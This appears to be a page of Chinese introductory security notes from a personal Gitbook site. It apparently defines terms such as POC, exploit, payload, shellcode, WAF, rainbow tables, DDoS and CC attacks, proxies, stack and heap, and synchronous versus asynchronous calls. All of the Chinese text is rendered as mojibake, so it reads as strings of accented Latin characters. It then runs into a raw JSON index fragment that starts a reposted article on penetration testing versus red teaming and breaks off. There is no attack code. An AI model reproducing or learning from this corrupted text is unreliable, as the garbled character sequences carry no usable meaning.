å®˜æ–¹å‘å¸ƒäº†è¡¥ä¸ï¼Œä½†è¯¥æ¼æ´ä»ç„¶å¤§é‡æœªä¿®å¤ï¼Œå­˜åœ¨ä¸€å®šå¯åˆ©ç”¨æ€§ POC ä¸€æ®µæ— å®³çš„ç”¨æ¥è¯æ˜æ¼æ´å­˜åœ¨çš„ä»£ç  EXPï¼ˆexploitï¼‰ ä¸€æ®µå¯¹æ¼æ´å¦‚ä½•åˆ©ç”¨çš„è¯¦ç»†è¯´æ˜æˆ–è€…ä¸€ä¸ªæ¼”ç¤ºçš„æ¼æ´æ”»å‡»ä»£ç  payloadï¼ˆæœ‰æ•ˆè½½è·ï¼‰ æŒ‡æˆåŠŸ exploit ä¹‹åï¼ŒçœŸæ­£åœ¨ç›®æ ‡ç³»ç»Ÿæ‰§è¡Œçš„ä»£ç æˆ–æŒ‡ä»¤ CVE Common Vulnerabilities & Exposures å…¬å…±æ¼æ´å’Œæš´éœ² CVEç¼–å·--æ¼æ´æ ‡ç­¾ ShellCode ä¸€æ®µ16è¿›åˆ¶æœºå™¨ç ï¼Œå¯åœ¨æš‚å­˜å™¨eipæº¢å‡ºåï¼Œå¡å…¥ä¸€æ®µå¯è®©CPUæ‰§è¡Œçš„shellcodeæœºå™¨ç ï¼Œä»è€Œæ‰§è¡Œä»»æ„æŒ‡ä»¤ï¼ŒEIPå¯„å­˜å™¨ï¼Œå®ƒé‡Œé¢å­˜æ”¾çš„å€¼æ˜¯CPUä¸‹æ¬¡è¦æ‰§è¡Œçš„æŒ‡ä»¤åœ°å€ï¼Œå› æ­¤å¯ä»¥é€šè¿‡ä¿®æ”¹EIPå¯„å­˜å™¨çš„å€¼æ¥æ‰§è¡Œshellcode FUZZ æ¨¡ç³Šæµ‹è¯•ï¼šéšæœºè¾“å…¥ï¼Œè§‚å¯Ÿè¾“ CMS å†…å®¹ç®¡ç†ç³»ç»Ÿï¼šæŒ‡çš„æ˜¯ä¸€ç§å†…å®¹ç¼–è¾‘ç¨‹åºã€‚å°±åƒåœ¨åšå®¢å†™æ–‡ç« ä¸€æ ·ï¼Œä¸éœ€è¦æ‡‚å¾—ç¼–ç¨‹çš„äººï¼Œä¹Ÿå¯ä»¥é€šè¿‡CMSå‘å¸ƒï¼Œæ›´æ”¹ï¼Œç®¡ç†å†…å®¹ã€‚ CNVD China National Vulnerability Database å›½å®¶ä¿¡æ¯å®‰å…¨æ¼æ´å…±äº«å¹³å° Rootkit è½½å…¥åˆ°æ“ä½œç³»ç»Ÿå†…æ ¸ä¸­çš„æ¶æ„è½¯ä»¶ï¼Œå…·æœ‰rootæƒé™ WAF Webåº”ç”¨é˜²ç«å¢™ï¼Œå…·æœ‰é’ˆå¯¹ HTTP/HTTPS çš„å®‰å…¨ç­–ç•¥ å ¡å’æœº ç›‘æ§å’Œè®°å½•è¿ç»´äººå‘˜å¯¹ç½‘ç»œå†…çš„æœåŠ¡å™¨ã€ç½‘ç»œè®¾å¤‡ã€å®‰å…¨è®¾å¤‡ã€æ•°æ®åº“ç­‰è®¾å¤‡çš„æ“ä½œè¡Œä¸ºï¼Œä»¥ä¾¿é›†ä¸­æŠ¥è­¦ã€åŠæ—¶å¤„ç†åŠå®¡è®¡å®šè´£ã€‚ å½©è™¹è¡¨ ç©ºé—´æ¢æ—¶é—´ï¼Œé€šè¿‡å“ˆå¸Œç¢°æ’ç ´è§£å“ˆå¸Œå€¼ ä¾›åº”é“¾æ”»å‡» æ”»å‡»è½¯ä»¶ä¾›åº”å•†ï¼Œå¦‚å‘æ›´æ–°ç¨‹åºä¸­æ³¨å…¥æœ¨é©¬ æ²™ç®± è™šæ‹Ÿç³»ç»Ÿç¨‹åºï¼š åœ¨éš”ç¦»ç¯å¢ƒä¸­ï¼Œç”¨ä»¥æµ‹è¯•ä¸å—ä¿¡ä»»çš„æ–‡ä»¶æˆ–åº”ç”¨ç¨‹åºç­‰è¡Œä¸ºçš„å·¥å…· åŸŸåæ³›è§£æ *.a.comæŒ‡å‘åŒä¸€IP OSINT å…¬å¼€æ¥æºæƒ…æŠ¥ï¼ˆOSINT, Open Source INTelligenceï¼‰æ˜¯ä»å…¬å¼€æ¥æºæ”¶é›†åˆ°çš„æƒ…æŠ¥ IDS Intrusion Detection Systemï¼ˆå…¥ä¾µæ£€æµ‹ç³»ç»Ÿï¼‰ï¼Œæ—è·¯éƒ¨ç½² IPS Intrusion Prevention Systemï¼ˆå…¥ä¾µé˜²å¾¡è®¾å¤‡ï¼‰ï¼Œä¸²è”éƒ¨ç½² SA Situation Awarenessï¼ˆæ€åŠ¿æ„ŸçŸ¥ï¼‰ï¼Œæ€åŠ¿æ„ŸçŸ¥æ˜¯ä¸€ç§åŸºäºç¯å¢ƒçš„ã€åŠ¨æ€ã€æ•´ä½“åœ°æ´æ‚‰å…¨ç½‘å®‰å…¨é£é™©çš„èƒ½åŠ›ã€‚å®ƒä»¥å®‰å…¨å¤§æ•°æ®ï¼ˆé‡‡é›†å…¨ç½‘æµé‡æ•°æ®å’Œå®‰å…¨é˜²æŠ¤è®¾å¤‡æ—¥å¿—ä¿¡æ¯ï¼‰ä¸ºåŸºç¡€ï¼Œä»å…¨å±€è§†è§’å¯¹å…¨ç½‘å®‰å…¨å¨èƒè¿›è¡Œå‘ç°è¯†åˆ«ã€ç†è§£åˆ†æå±•ç¤ºå’Œå“åº”å¤„ç½®ï¼Œå¹¶é¢„æµ‹å‘å±•è¶‹åŠ¿ï¼Œä¸ºåç»­ç½‘ç»œå®‰å…¨çš„ç›¸å…³å†³ç­–ä¸è¡ŒåŠ¨æä¾›æ•°æ®ä¾æ®ã€‚ AV anti-virus killerï¼ˆåç—…æ¯’æ€æ‰‹ï¼‰ï¼Œé˜²ç—…æ¯’è½¯ä»¶å¦‚WinowsDefinderï¼Œ360 ä¸Š/ä¸‹æ¸¸ä»£ç† è¯·æ±‚ï¼šå®¢æˆ·ç«¯â†’ä¸‹æ¸¸ä»£ç†â†’ä¸Šæ¸¸ä»£ç†â†’æœåŠ¡ç«¯ å“åº”ï¼šæœåŠ¡ç«¯â†’ä¸Šæ¸¸ä»£ç†â†’ä¸‹æ¸¸ä»£ç†â†’å®¢æˆ·ç«¯ RASP è¿è¡Œæ—¶åº”ç”¨ç¨‹åºè‡ªæˆ‘ä¿æŠ¤ï¼ˆRuntime application self-protectionï¼Œç®€ç§°RASPï¼‰RASPé‡‡ç”¨åŸºäºæ”»å‡»è¡Œä¸ºåˆ†æçš„ä¸»åŠ¨é˜²å¾¡æœºåˆ¶ï¼Œä¸¥é˜²æ–‡ä»¶è¯»å†™ã€æ•°æ®è®¿é—®ã€å‘½ä»¤æ‰§è¡Œç­‰Webåº”ç”¨ç³»ç»Ÿå‘½è„‰ï¼ˆåœ¨Webåº”ç”¨ç¨‹åºæ‰§è¡Œå…³é”®çš„Java APIä¹‹å‰æ’å…¥é˜²å¾¡é€»è¾‘ï¼ˆAPI HOOKï¼‰ï¼Œä»è€Œæ§åˆ¶åŸç±»æ–¹æ³•æ‰§è¡Œçš„ä¸šåŠ¡é€»è¾‘ï¼‰ è·¯ç”±å™¨ è·¯ç”±å™¨ï¼ˆRouterï¼‰æ˜¯ä¸€ç§ç½‘ç»œè®¾å¤‡ï¼Œç”¨äºå°†æ•°æ®åŒ…ä»ä¸€ä¸ªç½‘ç»œè½¬å‘åˆ°å¦ä¸€ä¸ªç½‘ç»œã€‚ä¸»è¦åŠŸèƒ½æ ¹æ®ç½‘ç»œåè®®å†³å®šæœ€ä½³çš„è·¯å¾„æ¥è½¬å‘æ•°æ®ï¼Œç½‘ç»œåœ°å€è½¬æ¢ï¼ˆNATï¼‰ äº¤æ¢æœº äº¤æ¢æœºæ˜¯ä¸€ç§ç½‘ç»œè®¾å¤‡ï¼Œç”¨äºåœ¨å±€åŸŸç½‘ä¸­ä¼ è¾“æ•°æ®åŒ…ã€‚å®ƒæœ‰å¤šä¸ªç«¯å£ï¼Œå¯ä»¥è¿æ¥å¤šå°è®¡ç®—æœºæˆ–å…¶ä»–ç½‘ç»œè®¾å¤‡ï¼Œå¦‚æ‰“å°æœºã€æœåŠ¡å™¨ç­‰ã€‚äº¤æ¢æœºèƒ½å¤Ÿæ ¹æ®æ¯ä¸ªæ•°æ®åŒ…çš„ç›®æ ‡åœ°å€ï¼Œå°†å…¶è½¬å‘åˆ°å¯¹åº”çš„ç›®æ ‡è®¾å¤‡ï¼Œå®ç°è®¾å¤‡ä¹‹é—´çš„é€šä¿¡å’Œæ•°æ®ä¼ è¾“ã€‚äº¤æ¢æœºè¿˜å¯ä»¥æä¾›ä¸€äº›é¢å¤–çš„åŠŸèƒ½ï¼Œå¦‚è™šæ‹Ÿå±€åŸŸç½‘ï¼ˆVLANï¼‰åˆ’åˆ†ã€å®‰å…¨ç­–ç•¥é…ç½®ç­‰ã€‚ MVCè®¾è®¡æ€æƒ³ ORM--å¯¹è±¡å…³ç³»æ˜ å°„ è •è™«ã€ç—…æ¯’ä¹‹é—´çš„åŒºåˆ« æ­£å‘/åå‘ä»£ç† https://www.cloudflare.com/zh-cn/learning/cdn/glossary/reverse-proxy/ æ­£å‘ä»£ç† è½¬å‘ä»£ç†ï¼Œé€šå¸¸ç§°ä¸ºä»£ç†ã€ä»£ç†æœåŠ¡å™¨æˆ– Web ä»£ç†ï¼Œæ˜¯ä½äºä¸€ç»„å®¢æˆ·ç«¯è®¡ç®—æœºä¹‹å‰çš„æœåŠ¡å™¨,ç¡®ä¿æ²¡æœ‰æºç«™ç›´æ¥ä¸è¯¥ç‰¹å®šå®¢æˆ·ç«¯é€šä¿¡ â€‹ åœ¨æ ‡å‡†çš„äº’è”ç½‘é€šä¿¡ä¸­ï¼Œè®¡ç®—æœº A å°†ç›´æ¥ä¸è®¡ç®—æœº C ä¿æŒè”ç³»ï¼Œå®¢æˆ·ç«¯å°†è¯·æ±‚å‘é€åˆ°æºæœåŠ¡å™¨ï¼Œå¹¶ä¸”æºæœåŠ¡å™¨å°†å“åº”å®¢æˆ·ç«¯ã€‚å½“å­˜åœ¨æ­£å‘/è½¬å‘ä»£ç†æ—¶ï¼ŒA å°†è¯·æ±‚å‘é€åˆ° Bï¼ŒB éšåå°†è¯·æ±‚è½¬å‘ç»™ Cã€‚C å°†å‘ B å‘é€å“åº”ï¼Œè€Œ B åˆ™å°†å“åº”è½¬å‘ç»™ Aã€‚ åå‘ä»£ç† åå‘ä»£ç†æ˜¯ä½äºä¸€ä¸ªæˆ–å¤šä¸ª Web æœåŠ¡å™¨å‰é¢çš„æœåŠ¡å™¨ï¼Œæ‹¦æˆªæ¥è‡ªå®¢æˆ·ç«¯çš„è¯·æ±‚ï¼Œç¡®ä¿æ²¡æœ‰å®¢æˆ·ç«¯ç›´æ¥ä¸è¯¥æºç«™é€šä¿¡ã€‚ â€‹ é€šå¸¸ï¼Œæ¥è‡ª D çš„æ‰€æœ‰è¯·æ±‚éƒ½å°†ç›´æ¥å‘é€åˆ° Fï¼Œè€Œ F ä¼šç›´æ¥å°†å“åº”å‘é€åˆ° Dã€‚ä½¿ç”¨åå‘ä»£ç†ï¼Œæ¥è‡ª D çš„æ‰€æœ‰è¯·æ±‚éƒ½å°†ç›´æ¥å‘é€ç»™ Eï¼Œè€Œ E ä¼šå°†å…¶è¯·æ±‚å‘é€åˆ° F å¹¶ä» F æ¥æ”¶å“åº”ï¼Œç„¶åå°†é€‚å½“å“åº”ä¼ é€’ç»™ Dã€‚ å¯¹è±¡ ä¼˜ç‚¹ æ­£å‘/è½¬å‘ä»£ç† å®¢æˆ·ç«¯ åŒ¿åï¼Œç»•è¿‡è®¿é—®é™åˆ¶ åå‘ä»£ç† æœåŠ¡ç«¯ æ›´åŠ å®‰å…¨ï¼Œæé«˜æœåŠ¡å™¨æ€§èƒ½ é™æ€webå’ŒåŠ¨æ€web https://help.dedecms.com/shiyongshouce/moshi/mingci.html ä¼ªé™æ€å³æ˜¯ç½‘ç«™æœ¬èº«æ˜¯åŠ¨æ€ç½‘é¡µå¦‚.phpã€.aspã€.aspxç­‰æ ¼å¼åŠ¨æ€ç½‘é¡µæœ‰æ—¶è¿™ç±»åŠ¨æ€ç½‘é¡µè¿˜è·Ÿ\"?\"åŠ å‚æ•°æ¥è¯»å–æ•°æ®åº“å†…ä¸åŒèµ„æ–™ï¼Œä¼ªé™æ€å°±æ˜¯åšurlé‡å†™æ“ä½œ(å³rewrite)ã€‚ demo è·³è½¬éœ€æ±‚ï¼š è®¿é—®http://www.kevin.com/p/123456.html è·³è½¬æˆ http://a.aa.com/p/123456 é…ç½®å¦‚ä¸‹: rewrite ^/p/(\\d+).html http://www.kevin.com/p/$1 last; è§£é‡Šè¯´æ˜ï¼š \\dæ˜¯æ•°å­—çš„æ„æ€ +æ˜¯æœ€å°‘ä¸€ä¸ª{1,} 1åˆ°æ— ç©·å¤§{1,3} è¿™æ ·æ˜¯1-3ä½æ•°ã€‚ DDOSæ”»å‡»å’ŒCCæ”»å‡» DDoSæ”»å‡»æ‰“çš„æ˜¯ç½‘ç«™çš„æœåŠ¡å™¨ï¼Œè€ŒCCæ”»å‡»æ˜¯é’ˆå¯¹ç½‘ç«™çš„é¡µé¢æ”»å‡»çš„ã€‚ ç”¨æœ¯è¯­æ¥è¯´å°±æ˜¯ï¼Œä¸€ä¸ªæ˜¯WEBç½‘ç»œå±‚æ‹’ç»æœåŠ¡æ”»å‡»ï¼ˆDDoSï¼‰ï¼Œä¸€ä¸ªæ˜¯WEBåº”ç”¨å±‚æ‹’ç»æœåŠ¡æ”»å‡»ï¼ˆCCï¼‰ã€‚ ç½‘ç»œå±‚å°±æ˜¯åˆ©ç”¨è‚‰é¸¡çš„æµé‡å»æ”»å‡»ç›®æ ‡ç½‘ç«™çš„æœåŠ¡å™¨ï¼Œé’ˆå¯¹æ¯”è¾ƒæœ¬æºçš„ä¸œè¥¿å»æ”»å‡»ï¼ˆé€šä¿¡ä¿¡é“ï¼‰ï¼ŒæœåŠ¡å™¨ç˜«ç—ªäº†ï¼Œé‚£ä¹ˆè¿è¡Œåœ¨æœåŠ¡å™¨ä¸Šçš„ç½‘ç«™è‚¯å®šä¹Ÿä¸èƒ½æ­£å¸¸è®¿é—®äº†ã€‚ è€Œåº”ç”¨å±‚å°±æ˜¯æˆ‘ä»¬ç”¨æˆ·çœ‹å¾—åˆ°çš„ä¸œè¥¿ï¼Œå°±æ¯”å¦‚è¯´ç½‘é¡µï¼ŒCCæ”»å‡»å°±æ˜¯é’ˆå¯¹ç½‘é¡µæ¥æ”»å‡»çš„ï¼ŒCCæ”»å‡»æœ¬èº«æ˜¯æ­£å¸¸è¯·æ±‚ï¼Œç½‘ç«™åŠ¨æ€é¡µé¢çš„æ­£å¸¸è¯·æ±‚ä¹Ÿä¼šå’Œæ•°æ®åº“è¿›è¡Œäº¤äº’çš„ï¼Œå½“è¿™ç§\"æ­£å¸¸è¯·æ±‚\"è¾¾åˆ°ä¸€ç§ç¨‹åº¦çš„æ—¶å€™ï¼ŒæœåŠ¡å™¨å°±ä¼šå“åº”ä¸è¿‡æ¥ï¼Œä»è€Œå´©æºƒã€‚ å½©è™¹è¡¨ https://zhuanlan.zhihu.com/p/105578739 å½©è™¹è¡¨(rainbow table)æ˜¯ä¸€ä¸ªç”¨äºåŠ å¯†æ•£åˆ—å‡½æ•°é€†è¿ç®—çš„é¢„å…ˆè®¡ç®—å¥½çš„è¡¨ï¼Œå¸¸ç”¨äºç ´è§£åŠ å¯†è¿‡çš„å¯†ç æ•£åˆ—ã€‚å¦‚MD5ï¼ŒSHA1. æŸ¥æ‰¾è¡¨å¸¸å¸¸ç”¨äºåŒ…å«æœ‰é™å­—ç¬¦å›ºå®šé•¿åº¦çº¯æ–‡æœ¬å¯†ç çš„åŠ å¯†ã€‚ äº‹å…ˆå‡†å¤‡å¤§é‡å“ˆå¸Œé“¾è¡¨ï¼š Xï¼šéšæœºç”Ÿæˆçš„æ˜æ–‡ Hï¼šå“ˆå¸Œå‡½æ•° Rï¼šè‡ªå®šä¹‰å‡½æ•° åªä¿å­˜å¼€å¤´å’Œæœ«å°¾ä½ç½®å³Xå’ŒRnã€‚ å¯¹äºç»è¿‡Hå¾—åˆ°çš„å¯†æ–‡Cè¿›è¡Œç ´è§£ï¼šé¦–å…ˆä½¿ç”¨Rå¾—åˆ°Y=Rï¼ˆCï¼‰ï¼Œå†å°†Yä¸Rnè¿›è¡Œæ¯”è¾ƒã€‚ â‘ å¦‚æœç›¸ç­‰ï¼Œåˆ™è¯´æ˜å¯†æ–‡Cå¯¹åº”çš„æ˜æ–‡Påœ¨å“ˆå¸Œé“¾è¡¨ä¸­çš„Rn-1å¤„ã€‚åŸç†è§ä¸‹å›¾ã€‚ â‘¡å¦‚æœä¸ç›¸ç­‰ï¼Œåˆ™è¯´æ˜å¯†æ–‡Cå¯¹åº”çš„æ˜æ–‡Pä¸åœ¨å“ˆå¸Œé“¾è¡¨ä¸­çš„Rn-1å¤„ã€‚æ‰€ä»¥éœ€è¦å‘å‰æŸ¥æ‰¾æ˜¯å¦åœ¨Rn-2~R1å¤„ã€‚ å…·ä½“æµç¨‹ï¼šå¯¹Yå†ç”¨Hå’ŒRå‡½æ•°ï¼Œå¾—åˆ°Yâ€˜ï¼Œä¸Rnæ¯”è¾ƒï¼Œå¦‚æœç›¸ç­‰ï¼Œåˆ™è¯´æ˜æ˜æ–‡ä¸ºRn-2ï¼Œå¦‚æœä¸æ˜¯ï¼Œå°±é‡å¤æ­¥éª¤ï¼Œç›´åˆ°æ‰€æœ‰å“ˆå¸Œé“¾è¡¨éƒ½æŸ¥æ‰¾è¿‡ï¼Œè¯´æ˜ç ´è§£å¤±è´¥ã€‚ é˜²å¾¡æ‰‹æ®µï¼šåŠ å¯†æ—¶ä½¿ç”¨ç›å€¼ å †å’Œæ ˆ å †å’Œæ ˆçš„åŒºåˆ« æ ˆåŒºä¿å­˜å£°æ˜çš„å˜é‡ä¾‹å¦‚int a=1,ç”±ç³»ç»Ÿè‡ªåŠ¨åˆ†é… å †åŒºä¿å­˜ç”¨æˆ·ç”³è¯·çš„å˜é‡ä¾‹å¦‚mallocï¼Œb=&a ç¨‹åºåœ¨ç¼–è¯‘å˜é‡å’Œå¯¹å‡½æ•°åˆ†é…å†…å­˜éƒ½åœ¨æ ˆä¸Šè¿›è¡Œï¼Œä¸”å‡½æ•°è°ƒç”¨æ—¶å‚æ•°çš„ä¼ é€’ä¹Ÿæ˜¯åœ¨æ ˆä¸Šè¿›è¡Œã€‚ æŒ‰å€¼ä¼ é€’ï¼ŒæŒ‰å¼•ç”¨ä¼ é€’å’ŒæŒ‰æŒ‡é’ˆä¼ é€’ https://www.junmajinlong.com/coding/pass_by_value_or_ref/ æŒ‰å€¼ä¼ é€’ å¼€è¾Ÿæ–°ç©ºé—´ï¼Œå°†æ•°æ®å¯¹è±¡æ‹·è´ä¸€ä»½å‰¯æœ¬åˆ°æ–°ç©ºé—´ä¸­ int a=10; int b=a; è¿™æ—¶å€™ä¿®æ”¹aæˆ–bçš„å€¼ï¼Œéƒ½ä¸ä¼šå½±å“å¦ä¸€ä¸ªå˜é‡çš„å€¼ æŒ‰å¼•ç”¨ä¼ é€’ int a=10; int &b=a; ä¸å¼€è¾Ÿæ–°ç©ºé—´ï¼Œåªæ˜¯ç»™æ•°æ®å¯¹è±¡æ‰€åœ¨ç©ºé—´åèµ·äº†ä¸€ä¸ªåˆ«å è¿™æ—¶å€™ä¿®æ”¹aæˆ–bçš„å€¼ï¼Œåº”è¯¥ä¼šå½±å“å¦ä¸€ä¸ªå˜é‡çš„å€¼ï¼Œå› ä¸ºäºŒè€…çš„åœ°å€æ˜¯ä¸€æ ·çš„ã€‚ æŒ‰æŒ‡é’ˆä¼ é€’ åœ¨cæˆ–c++å¯ä»¥æ“ä½œæŒ‡é’ˆçš„è¯­è¨€ä¸­ int a=10; int* b=&a; åœ¨å †å†…å­˜ä¸­å¼€è¾Ÿç©ºé—´ç”¨æ¥ä¿å­˜æŒ‡é’ˆbï¼ŒbæŒ‡å‘aæ‰€åœ¨çš„åœ°å€ï¼ˆä¿å­˜açš„åœ°å€ï¼‰ã€‚ é˜»å¡å’Œéé˜»å¡ï¼ŒåŒæ­¥å’Œå¼‚æ­¥ï¼Œå›è°ƒå‡½æ•° ä¾‹å­ æˆ‘è¦çœ‹è¶³çƒæ¯”èµ›ï¼Œä½†æ˜¯å¦ˆå¦ˆå«æˆ‘çƒ§æ°´ï¼Œç”µè§†æœºåœ¨å®¢å…ï¼Œçƒ§æ°´è¦åœ¨å¨æˆ¿ã€‚å®¶é‡Œæœ‰2ä¸ªæ°´å£¶ï¼Œä¸€ä¸ªæ˜¯æ™®é€šçš„æ°´å£¶ï¼Œå¦ä¸€ä¸ªæ˜¯æ°´å¼€äº†ä¼šå«çš„é‚£ç§æ°´å£¶ã€‚æˆ‘å¯ä»¥ï¼š ç”¨æ™®é€šçš„æ°´å£¶çƒ§ï¼Œäººåœ¨è¾¹ä¸Šçœ‹ç€ï¼Œæ°´å¼€äº†å†å»çœ‹çƒã€‚ï¼ˆåŒæ­¥ï¼Œé˜»å¡ï¼‰è¿™ä¸ªæ˜¯å¸¸è§„åšæ³•ï¼Œä½†æ˜¯æˆ‘çœ‹çƒä¸çˆ½äº†ã€‚ ç”¨æ™®é€šæ°´å£¶çƒ§ï¼Œäººå»çœ‹çƒï¼Œéš”å‡ åˆ†é’Ÿå»å¨æˆ¿çœ‹çœ‹ã€‚ï¼ˆåŒæ­¥ï¼Œéé˜»å¡ï¼‰è¿™ä¸ªåˆå¤§é—®é¢˜ï¼Œä¸‡ä¸€åœ¨æˆ‘ç¦»å¼€çš„å‡ åˆ†é’Ÿæ°´å¼€äº†ï¼Œæˆ‘å°±éº»çƒ¦äº†ã€‚ ç”¨ä¼šå«çš„æ°´å£¶ï¼Œäººåœ¨è¾¹ä¸Šçœ‹ç€ã€‚ï¼ˆå¼‚æ­¥ï¼Œé˜»å¡ï¼‰è¿™ä¸ªæ²¡æœ‰é—®é¢˜ï¼Œä½†æ˜¯æˆ‘å¤ªå‚»äº†ã€‚ ç”¨ä¼šå«çš„æ°´å£¶ï¼Œäººå»çœ‹çƒï¼Œå¬è§æ°´å£¶å«äº†å†å»çœ‹ã€‚ï¼ˆå¼‚æ­¥ï¼Œéé˜»å¡ï¼‰è¿™ä¸ªåº”è¯¥æ˜¯æœ€å¥½çš„ã€‚ ç­‰ç€çœ‹çƒçš„æˆ‘ï¼šé˜»å¡ çœ‹ç€ç”µè§†çš„æˆ‘ï¼šéé˜»å¡ æ™®é€šæ°´å£¶ï¼šåŒæ­¥ ä¼šå«çš„æ°´å£¶ï¼šå¼‚æ­¥ æ‰€ä»¥ï¼Œå¼‚æ­¥å¾€å¾€é…åˆéé˜»å¡ï¼Œæ‰èƒ½å‘æŒ¥å‡ºå¨åŠ›ã€‚ å›è°ƒå‡½æ•° åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œç”¨ä¼šå«çš„æ°´å£¶ï¼Œäººå»çœ‹çƒï¼Œå¬è§æ°´å£¶å«äº†å†å»çœ‹ã€‚ï¼ˆå¼‚æ­¥ï¼Œéé˜»å¡ï¼‰è¿™ä¸€æ–¹æ³•çš„å®ç°å°±æ˜¯ä½¿ç”¨äº†å›è°ƒå‡½æ•°ã€‚ MVCæ¶æ„ å°ç«¯åºå’Œå¤§ç«¯åº HTTPSå•å‘è®¤è¯ HTTPSåŒå‘è®¤è¯ CGIä¸fastCGI å…³äºCGIå’ŒFastCGIçš„ç†è§£ - å¤©ç”Ÿå¸…æ‰ - åšå®¢å›­ X64ã€X86å’ŒX86_64 X64ã€X86å’ŒX86_64éƒ½æ˜¯x86æŒ‡ä»¤é›†æ¶æ„ X86æ˜¯x86æŒ‡ä»¤é›†æ¶æ„çš„32ä½ç‰ˆæœ¬ã€‚ \"x86\"è¿™ä¸ªæœ¯è¯­æºè‡ªIntel 8086å¤„ç†å™¨ï¼Œå®ƒæ˜¯x86å®¶æ—çš„ç¬¬ä¸€æ¬¾å¤„ç†å™¨ã€‚ X64å’ŒX86_64éƒ½æ˜¯x86æŒ‡ä»¤é›†æ¶æ„çš„64ä½æ‰©å±•ï¼ˆX86_64å°†x86æ¶æ„çš„å…¼å®¹æ€§ä¸x64æ¶æ„çš„å¢å¼ºåŠŸèƒ½ç»“åˆèµ·æ¥ï¼‰ DASTã€SASTã€IAST ä¸€æ–‡æ´æ‚‰DASTã€SASTã€IAST â€”â€”Webåº”ç”¨å®‰å…¨æµ‹è¯•æŠ€æœ¯å¯¹æ¯”æµ…è°ˆ - å®‰å…¨ç‰› (aqniu.com) ä»€ä¹ˆæ˜¯å¼€å‘ç¯å¢ƒã€æµ‹è¯•ç¯å¢ƒã€UATç¯å¢ƒã€ä»¿çœŸç¯å¢ƒã€ç”Ÿäº§ç¯å¢ƒï¼Ÿ devç¯å¢ƒï¼šå¼€å‘ç¯å¢ƒï¼Œå¤–éƒ¨ç”¨æˆ·æ— æ³•è®¿é—®ï¼Œå¼€å‘äººå‘˜ä½¿ç”¨ï¼Œä¸€èˆ¬æ¥è®²ï¼Œå¼€å‘ç¯å¢ƒä¸­çš„æœåŠ¡å™¨é…ç½®æ¯”è¾ƒéšæ„ä¸»è¦æ˜¯ç”¨æ¥æµ‹è¯•çš„ï¼Œæ— ç”¨æˆ·äº¤äº’ï¼Œå¹¶ä¸”è¦æ‰“å¼€é”™è¯¯æŠ¥å‘Šï¼Œæ–¹ä¾¿ç¨‹åºå‘˜è°ƒè¯•ã€‚ testç¯å¢ƒï¼šæµ‹è¯•ç¯å¢ƒï¼Œå¤–éƒ¨ç”¨æˆ·æ— æ³•è®¿é—®ï¼Œä¸“é—¨ç»™æµ‹è¯•äººå‘˜ä½¿ç”¨çš„ï¼Œç‰ˆæœ¬ç›¸å¯¹ç¨³å®šã€‚ preç¯å¢ƒï¼šæ€§èƒ½è¯„ä¼°æµ‹è¯•ï¼ˆå‹æµ‹ï¼‰ç¯å¢ƒï¼Œå¤–éƒ¨ç”¨æˆ·å¯ä»¥è®¿é—®ï¼Œä½†æ˜¯æœåŠ¡å™¨é…ç½®ç›¸å¯¹ä½ï¼Œå…¶å®ƒå’Œç”Ÿäº§ä¸€æ ·ã€‚ uatç¯å¢ƒï¼šéªŒæ”¶æµ‹è¯•ç¯å¢ƒï¼Œä¸»è¦ä½œä¸ºå®¢æˆ·ä½“éªŒçš„ç¯å¢ƒã€‚ proç¯å¢ƒï¼šç”Ÿäº§ç¯å¢ƒï¼Œé¢å‘å¤–éƒ¨ç”¨æˆ·çš„ç¯å¢ƒï¼Œè¿æ¥ä¸Šäº’è”ç½‘å³å¯è®¿é—®çš„æ­£å¼ç¯å¢ƒã€‚ Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-24 21:46:36 "},"07.åŸºç¡€çŸ¥è¯†/æ¸—é€æµ‹è¯•å’Œçº¢é˜Ÿçš„åŒºåˆ«.html":{"url":"07.åŸºç¡€çŸ¥è¯†/æ¸—é€æµ‹è¯•å’Œçº¢é˜Ÿçš„åŒºåˆ«.html","title":"è½¬è½½--æ¸—é€æµ‹è¯•å’Œçº¢é˜Ÿçš„åŒºåˆ«","keywords":"","body":" æœ¬æ–‡æ¥è‡ªå­Ÿæå®éªŒå®¤ï¼Œç‰ˆæƒå½’ä½œè€…æ‰€æœ‰ è°ˆè°ˆæ¸—é€æµ‹è¯•å’Œçº¢é˜Ÿçš„åŒºåˆ« æœ€è¿‘åœ¨å„ç§å®‰å…¨ç›¸å…³çš„èµ„è®¯æˆ–è€…æŠ€æœ¯æ–‡ç« ä¸­ï¼Œè¶Šæ¥è¶Šå¤šçš„æåˆ°æ¸—é€æµ‹è¯•ï¼ˆæ¸—é€ Testingï¼‰å’Œçº¢é˜Ÿï¼ˆRed Teamï¼‰è¿™ä¸ªä¸¤ä¸ªè¯ï¼Œè€Œä¸”å¾ˆå¤šåœ°æ–¹æ˜¯æŠŠè¿™ä¸¤ä¸ªè¯çš„æ„æ€æ··ä¸ºä¸€ä½“ï¼Œè®¤ä¸ºæ˜¯ç›¸åŒçš„ä¸œè¥¿ã€‚è™½ç„¶è¿™ä¸¤è€…åœ¨æ–¹æ³•å’Œå®æ–½è¿‡ç¨‹ä¸­å­˜åœ¨ä¸€å®šç›¸ä¼¼ç”šè‡³é‡åˆçš„éƒ¨åˆ†ï¼Œä½†æ˜¯æ¸—é€æµ‹è¯•å’Œçº¢é˜Ÿè¿˜æ˜¯å­˜åœ¨ä¸€äº›æœ¬è´¨çš„å·®å¼‚ã€‚æœ¬æ–‡å°†åˆ†åˆ«å¯¹ä¸¤è€…è¿›è¡Œå®šä¹‰å’Œæè¿°ï¼Œæ–¹ä¾¿ä¼ä¸šæ ¹æ®è‡ªèº«å®‰å…¨éœ€æ±‚é€‰æ‹©åˆé€‚çš„å®‰å…¨æœåŠ¡ï¼Œä¹Ÿèƒ½ä»¥æ­¤è¯†åˆ«é‚£äº›æ‰“ç€çº¢é˜Ÿå¹Œå­å®é™…å¹²ç€æ¸—é€æµ‹è¯•æ´»çš„å®‰å…¨å…¬å¸ã€‚ æ¸—é€æµ‹è¯• æ¸—é€æµ‹è¯•æ˜¯å¯¹ç»™å®šçš„ç›®æ 